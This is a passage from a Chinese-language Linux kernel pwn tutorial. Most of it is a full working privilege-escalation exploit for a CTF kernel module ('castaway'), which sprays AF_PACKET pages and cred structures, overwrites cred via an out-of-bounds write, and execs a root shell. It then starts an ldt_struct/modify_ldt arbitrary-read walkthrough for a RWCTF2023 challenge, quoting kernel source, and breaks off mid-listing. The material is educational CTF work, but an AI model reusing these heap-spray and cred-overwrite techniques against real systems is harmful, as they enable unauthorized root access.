class="line">336</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_SPRAY_NUM 514</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_NUM 400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_PER_SLUB 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_request</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> index;<br>    <span class="hljs-type">size_t</span>	size;<br>    <span class="hljs-type">void</span> 	*buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">timer</span> =</span> &#123;<br>    .tv_sec = <span class="hljs-number">1145141919</span>,<br>    .tv_nsec = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>], check_root_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> bin_sh_str[] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">char</span> child_pipe_buf[<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> root_str[] = <span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span><br>                  <span class="hljs-string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0xCAFEBABE</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> index, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_request</span> <span class="hljs-title">r</span> =</span> &#123;<br>        .index = index,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xF00DBABE</span>, &amp;r);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">waiting_for_root_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdi, rdi; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 1;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rax, rax; &quot;</span> <span class="hljs-comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall;      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 102; &quot;</span> <span class="hljs-comment">/* getuid() */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jne failed; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdi, 1; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [root_str]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 80; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 1;&quot;</span>    <span class="hljs-comment">/* write(1, root_str, 71) */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [shell_args];  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 59;    &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall;        &quot;</span>   <span class="hljs-comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;failed: &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [timer]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 35; &quot;</span>  <span class="hljs-comment">/* nanosleep() */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>__attribute__((naked)) <span class="hljs-type">long</span> <span class="hljs-title function_">simple_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *))</span><br>&#123;<br>    <span class="hljs-comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot; mov r15, rsi; &quot;</span>   <span class="hljs-comment">/* save the rsi*/</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor rsi, rsi; &quot;</span>   <span class="hljs-comment">/* set esp and useless args to NULL */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor rdx, rdx; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r10, r10; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r8, r8;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r9, r9;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; mov rax, 56;  &quot;</span>   <span class="hljs-comment">/* __NR_clone */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; syscall;      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; cmp rax, 0;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; je child_fn;  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; ret;          &quot;</span>   <span class="hljs-comment">/* parent */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;child_fn:      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; jmp r15;      &quot;</span>   <span class="hljs-comment">/* child */</span></span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(<span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> aragc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">char</span> th_stack[<span class="hljs-number">0x1000</span>], buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/castaway&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open castaway device!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* use a new process for page spraying */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    &#125;<br><br>    <span class="hljs-comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spraying pgv pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span>(alloc_page(i) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray pages via socket!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* free pages for cred */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] freeing for cred pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="hljs-number">2</span>)&#123;<br>        free_page(i);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray cred to get the isolate pages we released before */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spraying cred...&quot;</span>);<br>    pipe(check_root_pipe);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, <br>                         waiting_for_root_fn) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to clone()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* free pages for our vulerable objects */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] freeing for vulnerable pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="hljs-number">2</span>)&#123;<br>        free_page(i);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    *(<span class="hljs-type">uint32_t</span>*) &amp;buf[VUL_OBJ_SIZE - <span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;    <span class="hljs-comment">/* cred-&gt;usage */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;<br>        alloc();<br>        edit(i, VUL_OBJ_SIZE, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking privilege in child processes */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] notifying child processes and waiting...&quot;</span>);<br>    write(check_root_pipe[<span class="hljs-number">1</span>], buf, CRED_SPRAY_NUM);<br>    sleep(<span class="hljs-number">1145141919</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>运行即可提权：</p>
<p><img src="https://s2.loli.net/2023/02/02/gSXEF2xm4J5wy8p.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x0A-Kernel-tricks"><a href="#0x0A-Kernel-tricks" class="headerlink" title="0x0A. Kernel tricks"></a>0x0A. Kernel tricks</h1><p>在学习了以上内核基本利用技巧之后，我们可以很容易地发现 kernel pwn 中的一些通用 tricks 与通用解法</p>
<h2 id="initramfs-在内存中直接搜索-flag"><a href="#initramfs-在内存中直接搜索-flag" class="headerlink" title="initramfs 在内存中直接搜索 flag"></a>initramfs 在内存中直接搜索 flag</h2><p><strong>Initial RAM disk</strong>（<code>initrd</code>）提供了在 boot loader 阶段载入一个 RAM disk 并挂载为根文件系统的能力，从而在该阶段运行一些用户态程序，在完成该阶段工作之后才是挂载真正的根文件系统</p>
<p>initrd 文件系统镜像通常为 gzip 格式，在启动阶段由 boot loader 将其路径传给 kernel，自 2.6 版本后出现了使用 cpio 格式的initramfs，从而无需挂载便能展开为一个文件系统</p>
<p>initrd&#x2F;initramfs 的特点便是<strong>文件系统中的所有内容都会被读取到内存当中</strong>，而大部分 CTF 中的 kernel pwn 题目都选择直接将 initrd 作为根文件系统，因此若是我们有着内存搜索能力，我们便能<strong>直接在内存空间中搜索 flag 的内容</strong>：）</p>
<h3 id="例题：RWCTF2023体验赛-Digging-into-kernel-3-1"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-3-1" class="headerlink" title="例题：RWCTF2023体验赛 - Digging into kernel 3"></a>例题：RWCTF2023体验赛 - Digging into kernel 3</h3><h4 id="①-题目分析-4"><a href="#①-题目分析-4" class="headerlink" title="① 题目分析"></a>① 题目分析</h4><p>题目已经在前面分析过了，这里笔者就不重复分析了：）</p>
<h4 id="②-漏洞利用：ldt-struct-直接读取-initramfs-内容"><a href="#②-漏洞利用：ldt-struct-直接读取-initramfs-内容" class="headerlink" title="② 漏洞利用：ldt_struct 直接读取 initramfs 内容"></a>② 漏洞利用：ldt_struct 直接读取 initramfs 内容</h4><p>既然题目中已经直接白给出了一个无限制的 UAF，那么利用方式就是多种多样的了 :-D 这里笔者选择利用 <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x03-ldt-struct-%E4%B8%8E-modify-ldt-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">ldt_struct</a> 直接在内存空间中搜索 flag 的方式解题</p>
<h5 id="Step-I-利用-ldt-struct-进行任意内存读取"><a href="#Step-I-利用-ldt-struct-进行任意内存读取" class="headerlink" title="Step.I - 利用 ldt_struct 进行任意内存读取"></a>Step.I - 利用 ldt_struct 进行任意内存读取</h5><p>ldt 即<strong>局部段描述符表</strong>（<strong>Local Descriptor Table</strong>），其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引，在内核中与 ldt 相关联的结构体为 <code>ldt_struct</code> ，该结构体定义如下， <code>entries</code> 指针指向一块描述符表的内存，<code>nr_entries</code> 表示 LDT 中的描述符数量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span><br><span class="hljs-comment">     * needed to prevent us from installing evil descriptors such as</span><br><span class="hljs-comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span><br><span class="hljs-comment">     * allocations, but it&#x27;s not worth trying to optimize.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span>    *<span class="hljs-title">entries</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        nr_entries;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span><br><span class="hljs-comment">     * in user mode.  The whole array will be aliased at the addressed</span><br><span class="hljs-comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span><br><span class="hljs-comment">     * and map, and enable a new LDT without invalidating the mapping</span><br><span class="hljs-comment">     * of an older, still-in-use LDT.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">int</span>            slot;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>我们主要关注该结构体如何用作漏洞利用，Linux 提供了一个 <code>modify_ldt()</code> 系统调用操纵当前进程的 <code>ldt_struct</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(modify_ldt, <span class="hljs-type">int</span> , func , <span class="hljs-type">void</span> __user * , ptr ,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> , bytecount)<br>&#123;<br>    <span class="hljs-type">int</span> ret = -ENOSYS;<br><br>    <span class="hljs-keyword">switch</span> (func) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        ret = read_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        ret = read_default_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x11</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span><br><span class="hljs-comment">     * return type, but tht ABI for sys_modify_ldt() expects</span><br><span class="hljs-comment">     * &#x27;int&#x27;.  